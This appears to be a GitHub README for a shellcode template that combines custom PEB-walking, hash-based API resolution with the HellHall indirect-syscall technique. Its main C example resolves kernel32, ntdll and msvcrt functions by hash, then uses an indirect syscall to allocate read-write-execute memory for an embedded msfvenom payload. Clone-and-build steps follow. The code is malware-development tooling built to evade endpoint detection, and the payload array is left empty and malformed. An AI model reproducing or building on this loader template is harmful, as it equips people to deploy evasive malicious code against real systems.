# HellHallShellcodeTemplate

Credit to [C5pider](https://github.com/Cracked5pider), [mrd0x](https://github.com/mrd0x), and [NUL0x4C](https://github.com/NUL0x4C) for [their](https://github.com/Cracked5pider/ShellcodeTemplate) [work](https://github.com/Maldev-Academy/HellHall)

This is a combination of the two projects. It only produces x64 shellcode.
### Example
The entrypoint of the shellcode is in the "Entry" function. 
This example initializes needed libraries and functions by using C5pider's custom written GetModuleHandle and GetProcAddress. It then uses an indirect syscall to allocate memory.
```c
SEC( text, B ) VOID Entry( VOID ) 
{
    // ------ Loading printf ------
    INSTANCE Instance = { };

    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    if ( Instance.Modules.Kernel32 != NULL )
    {
        // Load needed functions
        Instance.Win32.LoadLibraryA = LdrFunction( Instance.Modules.Kernel32, 0xb7072fdb );
        Instance.Modules.Msvcrt      = Instance.Win32.LoadLibraryA( GET_SYMBOL("msvcrt.dll") );
        Instance.Win32.printf = LdrFunction (Instance.Modules.Msvcrt, 0xc870eef8);
        
    }
    
    // ------ Initializing the syscall ------
    MyStruct S = { 0 };
    NTDLL       NtdllSt     = { 0 };
    SysFunc     sF          = { 0 };
   
	if (!InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading NtAllocateVirtualMemory");
		return FALSE;
    }
    getSysFuncStruct(&S.NtAllocateVirtualMemory, &sF);
    
    // ------ Syscall ------
    unsigned char rawData[] = {]; //Msfvenom calc
    PVOID		pAddress	= NULL;
	SIZE_T		dwSize		= sizeof(rawData);
	DWORD		dwOld		= NULL;
    PULONG		NumberOfBytesWritten = NULL;
	HANDLE		hThread		= NULL;
	NTSTATUS	STATUS		= NULL;

    SetConfig(S.NtAllocateVirtualMemory.wSSN, S.NtAllocateVirtualMemory.pInst);
    if ((STATUS = HellHall((HANDLE)-1, &pAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) != 0x0) {
        Instance.Win32.printf("Yikes, status was %#x\n", STATUS); 
    }
    Instance.Win32.printf("Memory was allocated to 0x%llx\n", pAddress);
}
```

### Get Started
Clone this project and you are ready to start
```
git clone https://github.com/susMdT/HellHallShellcodeTemplate/
make        
```
